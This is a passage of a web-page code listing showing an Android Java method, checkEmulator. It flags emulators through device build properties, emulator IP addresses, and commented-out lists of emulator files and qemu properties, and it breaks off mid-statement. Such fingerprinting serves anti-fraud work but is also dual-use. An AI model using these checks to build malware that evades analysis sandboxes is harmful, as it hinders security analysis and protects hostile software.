class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br></pre></td><td class="code"><pre><span class="line">      public static ListItemBean checkEmulator(Context context) &#123;</span><br><span class="line">        ArrayList&lt;String&gt; choose = new ArrayList&lt;&gt;();</span><br><span class="line">//        try &#123;</span><br><span class="line">//            String[] strArr = &#123;</span><br><span class="line">//                    &quot;/boot/bstmods/vboxguest.ko&quot;,</span><br><span class="line">//                    &quot;/boot/bstmods/vboxsf.ko&quot;,</span><br><span class="line">//                    &quot;/dev/mtp_usb&quot;,</span><br><span class="line">//                    &quot;/dev/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/dev/socket/baseband_genyd&quot;,</span><br><span class="line">//                    &quot;/dev/socket/genyd&quot;,</span><br><span class="line">//                    &quot;/dev/socket/qemud&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-audio&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-camera&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-gps&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-sensors&quot;,</span><br><span class="line">//                    &quot;/dev/vboxguest&quot;,</span><br><span class="line">//                    &quot;/dev/vboxpci&quot;,</span><br><span class="line">//                    &quot;/dev/vboxuser&quot;,</span><br><span class="line">//                    &quot;/fstab.goldfish&quot;,</span><br><span class="line">//                    &quot;/fstab.nox&quot;,</span><br><span class="line">//                    &quot;/fstab.ranchu-encrypt&quot;,</span><br><span class="line">//                    &quot;/fstab.ranchu-noencrypt&quot;,</span><br><span class="line">//                    &quot;/fstab.ttVM_x86&quot;,</span><br><span class="line">//                    &quot;/fstab.vbox86&quot;,</span><br><span class="line">//                    &quot;/init.goldfish.rc&quot;,</span><br><span class="line">//                    &quot;/init.magisk.rc&quot;,</span><br><span class="line">//                    &quot;/init.nox.rc&quot;,</span><br><span class="line">//                    &quot;/init.ranchu-encrypt.rc&quot;,</span><br><span class="line">//                    &quot;/init.ranchu-noencrypt.rc&quot;,</span><br><span class="line">//                    &quot;/init.ranchu.rc&quot;,</span><br><span class="line">//                    &quot;/init.ttVM_x86.rc&quot;,</span><br><span class="line">//                    &quot;/init.vbox86.rc&quot;,</span><br><span class="line">//                    &quot;/init.vbox86p.rc&quot;,</span><br><span class="line">//                    &quot;/init.windroye.rc&quot;,</span><br><span class="line">//                    &quot;/init.windroye.sh&quot;,</span><br><span class="line">//                    &quot;/init.x86.rc&quot;,</span><br><span class="line">//                    &quot;/proc/irq/20/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sdcard/Android/data/com.redfinger.gamemanage&quot;,</span><br><span class="line">//                    &quot;/stab.andy&quot;,</span><br><span class="line">//                    &quot;/sys/bus/pci/drivers/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/bus/pci/drivers/vboxpci&quot;,</span><br><span class="line">//                    &quot;/sys/bus/platform/drivers/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/bus/platform/drivers/qemu_pipe/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/bus/platform/drivers/qemu_trace&quot;,</span><br><span class="line">//                    &quot;/sys/bus/virtio/drivers/itolsvmlgtp&quot;,</span><br><span class="line">//                    &quot;/sys/bus/virtio/drivers/itoolsvmhft&quot;,</span><br><span class="line">//                    &quot;/sys/class/bdi/vboxsf-1&quot;,</span><br><span class="line">//                    &quot;/sys/class/bdi/vboxsf-2&quot;,</span><br><span class="line">//                    &quot;/sys/class/bdi/vboxsf-3&quot;,</span><br><span class="line">//                    &quot;/sys/class/misc/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/class/misc/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/class/misc/vboxuser&quot;,</span><br><span class="line">//                    &quot;/sys/devices/platform/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/bdi/vboxsf-1&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/bdi/vboxsf-2&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/bdi/vboxsf-3&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/vboxpci&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/vboxuser&quot;,</span><br><span class="line">//                    &quot;/sys/fs/selinux/booleans/in_qemu&quot;,</span><br><span class="line">//                    &quot;/sys/kernel/debug/bdi/vboxsf-1&quot;,</span><br><span class="line">//                    &quot;/sys/kernel/debug/bdi/vboxsf-2&quot;,</span><br><span class="line">//                    &quot;/sys/kernel/debug/x86&quot;,</span><br><span class="line">//                    &quot;/sys/module/qemu_trace_sysfs&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxguest/drivers/pci:vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxpcism&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxsf&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxvideo&quot;,</span><br><span class="line">//                    &quot;/sys/module/virtio_pt/drivers/virtio:itoolsvmhft&quot;,</span><br><span class="line">//                    &quot;/sys/module/virtio_pt_ie/drivers/virtio:itoolsvmlgtp&quot;,</span><br><span class="line">//                    &quot;/sys/qemu_trace&quot;,</span><br><span class="line">//                    &quot;/system/app/GenymotionLayout&quot;,</span><br><span class="line">//                    &quot;/system/bin/OpenglService&quot;,</span><br><span class="line">//                    &quot;/system/bin/androVM-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x_setprop&quot;,</span><br><span class="line">//                    &quot;/system/bin/enable_nox&quot;,</span><br><span class="line">//                    &quot;/system/bin/genymotion-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirt-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirt-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirt_setprop&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirtd&quot;,</span><br><span class="line">//                    &quot;/system/bin/mount.vboxsf&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox_setprop&quot;,</span><br><span class="line">//                    &quot;/system/bin/noxd&quot;,</span><br><span class="line">//                    &quot;/system/bin/noxscreen&quot;,</span><br><span class="line">//                    &quot;/system/bin/noxspeedup&quot;,</span><br><span class="line">//                    &quot;/system/bin/qemu-props&quot;,</span><br><span class="line">//                    &quot;/system/bin/qemud&quot;,</span><br><span class="line">//                    &quot;/system/bin/shellnox&quot;,</span><br><span class="line">//                    &quot;/system/bin/ttVM-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/windroyed&quot;,</span><br><span class="line">//                    &quot;/system/droid4x&quot;,</span><br><span class="line">//                    &quot;/system/etc/init.droid4x.sh&quot;,</span><br><span class="line">//                    &quot;/system/etc/init.tiantian.sh&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libEGL_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libEGL_tiantianVM.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libEGL_windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv1_CM_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv1_CM_tiantianVM.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv1_CM_windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv2_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv2_tiantianVM.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv2_windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/audio.primary.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/audio.primary.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/audio.primary.x86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/autio.primary.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.windroye.jpeg.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.x86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gps.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gps.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gps.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gralloc.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gralloc.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gralloc.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/sensors.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/sensors.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/sensors.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/init.nox.sh&quot;,</span><br><span class="line">//                    &quot;/system/lib/libGM_OpenglSystemCommon.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libc_malloc_debug_qemu.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libclcore_x86.bc&quot;,</span><br><span class="line">//                    &quot;/system/lib/libdroid4x.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libnoxd.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libnoxspeedup.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/modules/3.10.30-android-x86.hd+&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxguest.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxpcism.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxsf.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxvideo.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib64/egl/libEGL_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/egl/libGLESv1_CM_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/egl/libGLESv2_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/egl/libEGL_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/egl/libGLESv1_CM_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/egl/libGLESv2_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libandroidemu.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/hw/gralloc.ranchu.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/libc_malloc_debug_qemu.so&quot;,</span><br><span class="line">//                    &quot;/system/usr/Keylayout/droid4x_Virtual_Input.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/Genymotion_Virtual_Input.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/droid4x_Virtual_Input.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/nox_Virtual_Input.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/windroye.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/keychars/nox_gpio.kcm&quot;,</span><br><span class="line">//                    &quot;/system/usr/keychars/windroye.kcm&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/Genymotion_Virtual_Input.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/nox_Virtual_Input.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/nox_gpio.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/windroye.kl&quot;,</span><br><span class="line">//                    &quot;system/etc/init/ndk_translation_arm64.rc&quot;,</span><br><span class="line">//                    &quot;/system/xbin/noxsu&quot;,</span><br><span class="line">//                    &quot;/ueventd.android_x86.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.andy.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.goldfish.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.nox.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.ranchu.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.ttVM_x86.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.vbox86.rc&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libgoldfish-ril.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libgoldfish_codecs_common.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libstagefright_goldfish_avcdec.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libstagefright_goldfish_vpxdec.so&quot;,</span><br><span class="line">//                    &quot;/x86.prop&quot;</span><br><span class="line">//            &#125;;</span><br><span class="line">//            for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">//                String f = strArr[i];</span><br><span class="line">//                if (new File(f).exists())</span><br><span class="line">//                    choose.add(f);</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125; catch (Exception e) &#123;</span><br><span class="line">//            e.printStackTrace();</span><br><span class="line">//        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;generic&quot;,</span><br><span class="line">                    &quot;vbox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.FINGERPRINT.contains(str))</span><br><span class="line">                    choose.add(Build.FINGERPRINT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;google_sdk&quot;,</span><br><span class="line">                    &quot;emulator&quot;,</span><br><span class="line">                    &quot;android sdk built for&quot;,</span><br><span class="line">                    &quot;droid4x&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.MODEL.contains(str))</span><br><span class="line">                    choose.add(Build.MODEL);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;Genymotion&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.MANUFACTURER.contains(str))</span><br><span class="line">                    choose.add(Build.MANUFACTURER);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;google_sdk&quot;, &quot;sdk_phone&quot;, &quot;sdk_x86&quot;, &quot;vbox86p&quot;, &quot;nox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.PRODUCT.toLowerCase(Locale.ROOT).contains(str))</span><br><span class="line">                    choose.add(Build.PRODUCT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;nox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.BOARD.toLowerCase(Locale.ROOT).contains(str))</span><br><span class="line">                    choose.add(Build.BOARD);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;nox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.BOOTLOADER.toLowerCase(Locale.ROOT).contains(str))</span><br><span class="line">                    choose.add(Build.BOOTLOADER);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;ranchu&quot;, &quot;vbox86&quot;, &quot;goldfish&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.HARDWARE.equalsIgnoreCase(str))</span><br><span class="line">                    choose.add(Build.HARDWARE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">            while (networkInterfaces.hasMoreElements()) &#123;</span><br><span class="line">                NetworkInterface ele = networkInterfaces.nextElement();</span><br><span class="line">                if (ele != null) &#123;</span><br><span class="line">                    Enumeration&lt;InetAddress&gt; inetAddresses = ele.getInetAddresses();</span><br><span class="line">                    while (inetAddresses.hasMoreElements()) &#123;</span><br><span class="line">                        InetAddress nextElement = inetAddresses.nextElement();</span><br><span class="line">                        if (!nextElement.isLoopbackAddress() &amp;&amp;</span><br><span class="line">                                (nextElement instanceof Inet4Address)) &#123;</span><br><span class="line">                            String ip = nextElement.getHostAddress();</span><br><span class="line">                            if (ip == null) continue;</span><br><span class="line">                            if (ip.equalsIgnoreCase(&quot;10.0.2.15&quot;) ||</span><br><span class="line">                                    ip.equalsIgnoreCase(&quot;10.0.2.16&quot;)) &#123;</span><br><span class="line">                                choose.add(ip);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">//        try &#123;</span><br><span class="line">//            String[] qemuProps = &#123;</span><br><span class="line">//                    &quot;ro.kernel.qemu.avd_name&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.gles&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.gltransport&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.opengles.version&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.uirenderer&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.vsync&quot;,</span><br><span class="line">//                    &quot;ro.qemu.initrc&quot;,</span><br><span class="line">//                    &quot;init.svc.qemu-props&quot;,</span><br><span class="line">//                    &quot;qemu.adb.secure&quot;,</span><br><span class="line">//                    &quot;qemu.cmdline&quot;,</span><br><span class="line">//                    &quot;qemu.hw.mainkeys&quot;,</span><br><span class="line">//                    &quot;qemu.logcat&quot;,</span><br><span class="line">//                    &quot;ro.adb.qemud&quot;,</span><br><span class="line">//                    &quot;qemu.sf.fake_camera&quot;,</span><br><span class="line">//                    &quot;qemu.sf.lcd_density&quot;,</span><br><span class="line">//                    &quot;qemu.timezone&quot;,</span><br><span class="line">//                    &quot;init.svc.goldfish-logcat&quot;,</span><br><span class="line">//                    &quot;ro.boottime.goldfish-logcat&quot;,</span><br><span class="line">//                    &quot;ro.hardware.audio.primary&quot;,</span><br><span class="line">//                    &quot;init.svc.ranchu-net&quot;,</span><br><span class="line">//                    &quot;init.svc.ranchu-setup&quot;,</span><br><span class="line">//                    &quot;ro.boottime.ranchu-net&quot;,</span><br><span class="line">//                    &quot;ro.boottime.ranchu-setup&quot;,</span><br><span class="line">//                    &quot;init.svc.droid4x&quot;,</span><br><span class="line">//                    &quot;init.svc.noxd&quot;,</span><br><span class="line">//                    &quot;init.svc.qemud&quot;,</span><br><span class="line">//                    &quot;init.svc.goldfish-setup&quot;,</span><br><span class="line">//                    &quot;init.svc.goldfish-logcat&quot;,</span><br><span class="line">//                    &quot;init.svc.ttVM_x86-setup&quot;,</span><br><span class="line">//                    &quot;vmos.browser.home&quot;,</span><br><span class="line">//                    &quot;vmos.camera.enable&quot;,</span><br><span class="line">//                    &quot;ro.trd_yehuo_searchbox&quot;,</span><br><span class="line">//                    &quot;init.svc.microvirtd&quot;,</span><br><span class="line">//                    &quot;init.svc.vbox86-setup&quot;,</span><br><span class="line">//                    &quot;ro.ndk_translation.version&quot;,</span><br><span class="line">//                    &quot;redroid.width&quot;,</span><br><span class="line">//                    &quot;redroid.height&quot;,</span><br><span class="line">//                    &quot;redroid.fps&quot;,</span><br><span class="line">//                    &quot;ro.rf.vmname&quot;</span><br><span class="line">//            &#125;;</span><br><span class="line">//</span><br><span class="line">//            for (String str : qemuProps) &#123;</span><br><span class="line">//                String val = 